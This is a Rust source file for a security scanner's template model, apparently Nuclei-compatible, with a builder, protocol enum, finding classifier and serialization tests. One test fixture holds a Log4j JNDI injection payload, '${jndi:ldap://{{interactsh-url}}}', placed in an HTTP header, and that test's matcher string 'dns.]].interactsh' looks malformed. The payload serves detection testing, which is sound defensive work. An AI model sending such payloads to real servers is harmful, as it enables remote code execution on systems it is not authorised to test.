//! Core template data model: the universal IR that all compilers target.
//!
//! A [`Template`] contains metadata, protocol, requests with matchers and
//! extractors, variables, workflows, and extensions. This model represents
//! the intersection of Nuclei, Sigma, and YARA template semantics.

pub mod info;
pub mod matchers;
pub mod request;

pub use info::*;
pub use matchers::*;
pub use request::*;

use crate::Severity;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Unique identifier for a template, matching Nuclei's convention.
/// Example: "CVE-2021-44228" or "tech-detect/nginx"
pub type TemplateId = String;

/// A template import declaration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateImport {
    /// The ID of the imported template.
    pub id: String,
    /// Optional alias for the imported template.
    pub alias: Option<String>,
}

/// Builder for creating [`Template`] values programmatically.
#[derive(Debug, Clone, Default)]
pub struct TemplateBuilder {
    id: String,
    name: String,
    author: Vec<String>,
    severity: Severity,
    tags: Vec<String>,
    requests: Vec<RequestDef>,
    workflows: Vec<Workflow>,
    protocol: Protocol,
}

impl TemplateBuilder {
    /// Create a new builder for the provided template identifier.
    pub fn new(id: impl Into<String>) -> Self {
        Self {
            id: id.into(),
            ..Default::default()
        }
    }

    /// Set the human-readable template name.
    #[must_use]
    pub fn name(mut self, name: impl Into<String>) -> Self {
        self.name = name.into();
        self
    }

    /// Append a template author identifier.
    #[must_use]
    pub fn author(mut self, author: impl Into<String>) -> Self {
        self.author.push(author.into());
        self
    }

    /// Set the template severity.
    #[must_use]
    pub fn severity(mut self, severity: Severity) -> Self {
        self.severity = severity;
        self
    }

    /// Replace the template tags.
    #[must_use]
    pub fn tags(mut self, tags: Vec<String>) -> Self {
        self.tags = tags;
        self
    }

    /// Append a single request definition.
    #[must_use]
    pub fn request(mut self, request: RequestDef) -> Self {
        self.requests.push(request);
        self
    }

    /// Append multiple request definitions.
    #[must_use]
    pub fn requests(mut self, requests: Vec<RequestDef>) -> Self {
        self.requests.extend(requests);
        self
    }

    /// Append a workflow definition.
    #[must_use]
    pub fn workflow(mut self, workflow: Workflow) -> Self {
        self.workflows.push(workflow);
        self
    }

    /// Append multiple workflow definitions.
    #[must_use]
    pub fn workflows(mut self, workflows: Vec<Workflow>) -> Self {
        self.workflows.extend(workflows);
        self
    }

    /// Set the template protocol family.
    #[must_use]
    pub fn protocol(mut self, protocol: Protocol) -> Self {
        self.protocol = protocol;
        self
    }

    /// Finalize the builder into a [`Template`], validating its contents.
    ///
    /// Returns an error if the template id is empty or if both requests and
    /// workflows are empty.
    ///
    /// # Errors
    ///
    /// Returns an error when the builder contains an empty template ID or no requests/workflows.
    pub fn build(self) -> Result<Template, crate::Error> {
        self.try_build()
    }

    /// Finalize the builder into a [`Template`], validating its contents.
    ///
    /// # Errors
    ///
    /// Returns an error when the builder contains an empty template ID or no requests/workflows.
    pub fn try_build(self) -> Result<Template, crate::Error> {
        if self.id.is_empty() {
            return Err(crate::Error::TemplateValidation {
                id: "unknown".to_string(),
                reason: "template id must not be empty".to_string(),
            });
        }
        if self.requests.is_empty() && self.workflows.is_empty() {
            return Err(crate::Error::TemplateValidation {
                id: self.id.clone(),
                reason: "template must have at least one request or workflow".to_string(),
            });
        }
        Ok(Template {
            id: self.id,
            ir_version: default_ir_version(),
            extends: None,
            imports: Vec::new(),
            info: TemplateInfo {
                name: self.name,
                author: self.author,
                severity: self.severity,
                description: None,
                reference: Vec::new(),
                tags: self.tags,
                metadata: TemplateMeta::default(),
            },
            requests: self.requests,
            protocol: self.protocol,
            self_contained: false,
            variables: HashMap::new(),
            cli_variables: HashMap::new(),
            source_path: None,
            flow: None,
            workflows: self.workflows,
            karyx_extensions: HashMap::new(),
            parallel_groups: Vec::new(),
        })
    }
}

/// Protocol family used by a template.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
#[non_exhaustive]
pub enum Protocol {
    /// HTTP or HTTPS requests.
    #[default]
    Http,
    /// DNS queries.
    Dns,
    /// Raw TCP sockets.
    Tcp,
    /// SSL/TLS certificate inspection.
    Ssl,
    /// WebSocket sessions.
    Websocket,
    /// Browser automation workflows.
    Headless,
    /// Embedded code execution.
    Code,
    /// File system scanning.
    File,
    /// WHOIS queries.
    Whois,
    /// JavaScript-based template execution.
    Javascript,
}

impl Protocol {
    /// Return the canonical lowercase name for this protocol.
    pub fn name(&self) -> &'static str {
        match self {
            Protocol::Http => "http",
            Protocol::Dns => "dns",
            Protocol::Tcp => "tcp",
            Protocol::Ssl => "ssl",
            Protocol::Websocket => "websocket",
            Protocol::Headless => "headless",
            Protocol::Code => "code",
            Protocol::File => "file",
            Protocol::Whois => "whois",
            Protocol::Javascript => "javascript",
        }
    }
}

impl Template {
    /// Classify this template into a high-level finding kind from its tags.
    pub fn classify(&self) -> crate::FindingKind {
        let tags = &self.info.tags;
        if tags
            .iter()
            .any(|t| matches!(t.as_str(), "cve" | "rce" | "sqli" | "xss" | "lfi"))
        {
            crate::FindingKind::Vulnerability
        } else if tags
            .iter()
            .any(|t| matches!(t.as_str(), "misconfig" | "misconfiguration"))
        {
            crate::FindingKind::Misconfiguration
        } else if tags
            .iter()
            .any(|t| matches!(t.as_str(), "exposure" | "panel" | "login"))
        {
            crate::FindingKind::Exposure
        } else if tags.iter().any(|t| matches!(t.as_str(), "tech" | "detect")) {
            crate::FindingKind::TechDetect
        } else if tags
            .iter()
            .any(|t| matches!(t.as_str(), "default-login" | "default-credentials"))
        {
            crate::FindingKind::DefaultCredentials
        } else if tags
            .iter()
            .any(|t| matches!(t.as_str(), "disclosure" | "info"))
        {
            crate::FindingKind::InfoDisclosure
        } else if tags
            .iter()
            .any(|t| matches!(t.as_str(), "file" | "directory"))
        {
            crate::FindingKind::FileDiscovery
        } else {
            crate::FindingKind::Other
        }
    }

    /// Create a [`TemplateBuilder`] seeded with the provided identifier.
    pub fn builder(id: &str) -> TemplateBuilder {
        TemplateBuilder::new(id)
    }
}

/// The complete intermediate representation of a parsed template.
/// This is the compiler's output and the engine's input.
/// Nuclei YAML compiles to this. Future formats (TOML, JSON) also compile to this.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Template {
    /// Unique template identifier.
    pub id: TemplateId,

    /// IR format version — enables backwards-compatible evolution.
    #[serde(default = "default_ir_version")]
    pub ir_version: u32,

    /// Optional parent template to inherit from.
    #[serde(default)]
    pub extends: Option<String>,

    #[serde(default)]
    pub imports: Vec<TemplateImport>,

    /// Human-readable metadata.
    pub info: TemplateInfo,

    /// Ordered list of requests to execute.
    /// Multiple requests form a sequence — output of request N
    /// can feed into request N+1 via extractors.
    pub requests: Vec<RequestDef>,

    /// Protocol family used by this template.
    #[serde(default)]
    pub protocol: Protocol,

    /// Whether this template embeds its own target and does not require an external one.
    #[serde(default, rename = "self-contained")]
    pub self_contained: bool,

    /// Variables defined at template level, available to all requests.
    #[serde(default)]
    pub variables: HashMap<String, String>,

    /// Variables supplied externally at runtime, such as `-var` CLI flags.
    #[serde(default)]
    pub cli_variables: HashMap<String, String>,

    /// Path to the source file (for diagnostics).
    #[serde(default)]
    pub source_path: Option<String>,

    /// Optional Nuclei flow expression for conditional multi-request execution.
    #[serde(default)]
    pub flow: Option<String>,

    /// Optional workflow declarations that reference this template or other templates.
    #[serde(default)]
    pub workflows: Vec<Workflow>,

    /// Karyx-specific extensions that are not part of the standard Nuclei format.
    #[serde(default)]
    pub karyx_extensions: HashMap<String, serde_json::Value>,

    /// Parallel groups of requests
    #[serde(default)]
    pub parallel_groups: Vec<ParallelGroup>,
}

/// A workflow entry point consisting of one or more execution steps.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Workflow {
    /// Ordered list of workflow steps to execute.
    #[serde(default)]
    pub steps: Vec<WorkflowStep>,
}

/// A workflow step that runs a template and optionally executes subtemplates.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkflowStep {
    /// ID of the template to execute for this step.
    pub template_id: String,
    /// Sub-steps to execute if this template produces findings.
    #[serde(default)]
    pub subtemplates: Vec<WorkflowStep>,
}

/// A group of requests that can be executed in parallel.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParallelGroup {
    /// Indices of the requests in the template.
    pub request_indices: Vec<usize>,
}

pub(crate) fn default_ir_version() -> u32 {
    1
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn template_roundtrip_json() {
        let template = Template {
            id: "CVE-2021-44228".to_string(),
            ir_version: default_ir_version(),
            extends: None,
            imports: Vec::new(),
            info: TemplateInfo {
                name: "Log4j RCE".to_string(),
                author: vec!["santh".to_string()],
                severity: Severity::Critical,
                description: Some("Apache Log4j2 JNDI RCE".to_string()),
                reference: vec!["https://nvd.nist.gov/vuln/detail/CVE-2021-44228".to_string()],
                tags: vec!["cve".to_string(), "rce".to_string(), "log4j".to_string()],
                metadata: TemplateMeta {
                    cve_id: vec!["CVE-2021-44228".to_string()],
                    cwe_id: vec!["CWE-502".to_string()],
                    cvss_score: Some(10.0),
                    extra: HashMap::new(),
                },
            },
            requests: vec![RequestDef {
                headers: HashMap::from([(
                    "X-Api-Version".to_string(),
                    "${jndi:ldap://{{interactsh-url}}}".to_string(),
                )]),
                attack: AttackType::ClusterBomb,
                matchers: vec![MatcherDef {
                    kind: MatcherKind::Word,
                    values: vec!["dns.]].interactsh".to_string()],
                    part: MatchPart::Body,
                    negative: false,
                    condition: MatcherCondition::Or,
                    internal: false,
                }],
                matchers_condition: MatcherCondition::And,
                ..RequestDef::default()
            }],
            protocol: Protocol::Http,
            self_contained: false,
            variables: HashMap::new(),
            cli_variables: HashMap::new(),
            source_path: None,
            flow: None,
            workflows: Vec::new(),
            karyx_extensions: HashMap::new(),
            parallel_groups: Vec::new(),
        };

        let json = serde_json::to_string_pretty(&template).expect("operation should succeed");
        let roundtripped: Template = serde_json::from_str(&json).expect("operation should succeed");
        assert_eq!(roundtripped.id, template.id);
        assert_eq!(roundtripped.extends, template.extends);
        assert_eq!(roundtripped.info.severity, Severity::Critical);
        assert_eq!(roundtripped.requests.len(), 1);
        assert_eq!(roundtripped.requests[0].matchers.len(), 1);
    }

    #[test]
    fn template_json_roundtrip_preserves_structure() {
        let template = Template {
            id: "tech-detect/nginx".to_string(),
            ir_version: default_ir_version(),
            extends: Some("tech-detect/base".to_string()),
            imports: Vec::new(),
            info: TemplateInfo {
                name: "Nginx Detect".to_string(),
                author: vec!["tester".to_string()],
                severity: Severity::Medium,
                description: Some("Detects nginx".to_string()),
                reference: vec!["https://example.com/nginx".to_string()],
                tags: vec!["tech".to_string(), "nginx".to_string()],
                metadata: TemplateMeta {
                    cve_id: Vec::new(),
                    cwe_id: Vec::new(),
                    cvss_score: None,
                    extra: HashMap::from([(
                        "family".to_string(),
                        serde_json::Value::String("web".to_string()),
                    )]),
                },
            },
            requests: vec![RequestDef {
                method: "POST".to_string(),
                paths: vec!["{{BaseURL}}/detect".to_string()],
                headers: HashMap::from([(
                    "Content-Type".to_string(),
                    "application/json".to_string(),
                )]),
                body: Some("{\"server\":\"{{Hostname}}\"}".to_string()),
                matchers: vec![MatcherDef {
                    kind: MatcherKind::Word,
                    values: vec!["nginx".to_string()],
                    part: MatchPart::Body,
                    negative: false,
                    condition: MatcherCondition::Or,
                    internal: false,
                }],
                max_response_time_ms: Some(500),
                ..RequestDef::default()
            }],
            protocol: Protocol::Http,
            self_contained: false,
            variables: HashMap::from([("Hostname".to_string(), "example.com".to_string())]),
            cli_variables: HashMap::new(),
            source_path: Some("templates/nginx.yaml".to_string()),
            flow: Some("http(1) && http(2)".to_string()),
            workflows: vec![Workflow {
                steps: vec![WorkflowStep {
                    template_id: "child-template".to_string(),
                    subtemplates: Vec::new(),
                }],
            }],
            karyx_extensions: HashMap::from([(
                "verified".to_string(),
                serde_json::Value::Bool(true),
            )]),
            parallel_groups: Vec::new(),
        };

        let serialized = serde_json::to_value(&template).expect("operation should succeed");
        let roundtripped: Template =
            serde_json::from_value(serialized.clone()).expect("operation should succeed");
        let roundtripped_serialized =
            serde_json::to_value(&roundtripped).expect("operation should succeed");

        assert_eq!(roundtripped_serialized, serialized);
    }

    #[test]
    fn severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::Info);
    }

    #[test]
    fn matcher_kind_variants() {
        let word: MatcherKind = serde_json::from_str("\"word\"").expect("operation should succeed");
        assert_eq!(word, MatcherKind::Word);

        let regex: MatcherKind =
            serde_json::from_str("\"regex\"").expect("operation should succeed");
        assert_eq!(regex, MatcherKind::Regex);

        let status: MatcherKind =
            serde_json::from_str("\"status\"").expect("operation should succeed");
        assert_eq!(status, MatcherKind::Status);
    }

    #[test]
    fn encoding_variants_deserialize_from_lowercase_names() {
        let url: Encoding = serde_json::from_str("\"url\"").expect("operation should succeed");
        assert_eq!(url, Encoding::UrlEncode);
        let url_legacy: Encoding =
            serde_json::from_str("\"urlencode\"").expect("operation should succeed");
        assert_eq!(url_legacy, Encoding::UrlEncode);

        let double_url: Encoding =
            serde_json::from_str("\"double-url\"").expect("operation should succeed");
        assert_eq!(double_url, Encoding::DoubleUrlEncode);
        let double_url_legacy: Encoding =
            serde_json::from_str("\"doubleurlencode\"").expect("operation should succeed");
        assert_eq!(double_url_legacy, Encoding::DoubleUrlEncode);

        let html: Encoding = serde_json::from_str("\"html\"").expect("operation should succeed");
        assert_eq!(html, Encoding::HtmlEncode);
        let html_legacy: Encoding =
            serde_json::from_str("\"htmlencode\"").expect("operation should succeed");
        assert_eq!(html_legacy, Encoding::HtmlEncode);
    }

    #[test]
    fn protocol_enum_serialization_roundtrip() {
        let protocols = [
            (Protocol::Http, "\"http\""),
            (Protocol::Dns, "\"dns\""),
            (Protocol::Tcp, "\"tcp\""),
            (Protocol::Ssl, "\"ssl\""),
            (Protocol::Websocket, "\"websocket\""),
            (Protocol::Headless, "\"headless\""),
            (Protocol::Code, "\"code\""),
            (Protocol::File, "\"file\""),
            (Protocol::Whois, "\"whois\""),
        ];

        for (protocol, expected_json) in protocols {
            let serialized = serde_json::to_string(&protocol).expect("operation should succeed");
            assert_eq!(serialized, expected_json);
            let roundtripped: Protocol =
                serde_json::from_str(&serialized).expect("operation should succeed");
            assert_eq!(roundtripped, protocol);
        }
    }

    #[test]
    fn attack_type_default_is_battering_ram() {
        assert_eq!(AttackType::default(), AttackType::BatteringRam);
    }

    #[test]
    fn protocol_default_is_http() {
        assert_eq!(Protocol::default(), Protocol::Http);
    }

    #[test]
    fn network_input_type_default_is_string() {
        assert_eq!(NetworkInputType::default(), NetworkInputType::String);
    }

    #[test]
    fn encoding_enum_serialization() {
        let encodings = [
            (Encoding::UrlEncode, "\"url\""),
            (Encoding::DoubleUrlEncode, "\"double-url\""),
            (Encoding::HtmlEncode, "\"html\""),
            (Encoding::UnicodeEncode, "\"unicode\""),
            (Encoding::Base64Encode, "\"base64\""),
            (Encoding::HexEncode, "\"hex\""),
        ];

        for (encoding, expected_json) in encodings {
            let serialized = serde_json::to_string(&encoding).expect("operation should succeed");
            assert_eq!(serialized, expected_json);
            let roundtripped: Encoding =
                serde_json::from_str(&serialized).expect("operation should succeed");
            assert_eq!(roundtripped, encoding);
        }
    }

    #[test]
    fn protocol_request_roundtrip_json() {
        let request = ProtocolRequest::Dns(DnsRequestDef {
            name: "{{FQDN}}".to_string(),
            query_type: "TXT".to_string(),
            query_class: Some("IN".to_string()),
            recursion: true,
            matchers: vec![MatcherDef {
                kind: MatcherKind::Word,
                values: vec!["v=spf1".to_string()],
                part: MatchPart::Body,
                negative: false,
                condition: MatcherCondition::Or,
                internal: false,
            }],
            matchers_condition: MatcherCondition::Or,
            extractors: Vec::new(),
            stop_at_first_match: false,
            call: None,
        });

        let serialized = serde_json::to_string(&request).expect("operation should succeed");
        let roundtripped: ProtocolRequest =
            serde_json::from_str(&serialized).expect("operation should succeed");
        match roundtripped {
            ProtocolRequest::Dns(dns) => {
                assert_eq!(dns.name, "{{FQDN}}");
                assert_eq!(dns.query_type, "TXT");
            }
            other => panic!("unexpected protocol request: {other:?}"),
        }
    }
}
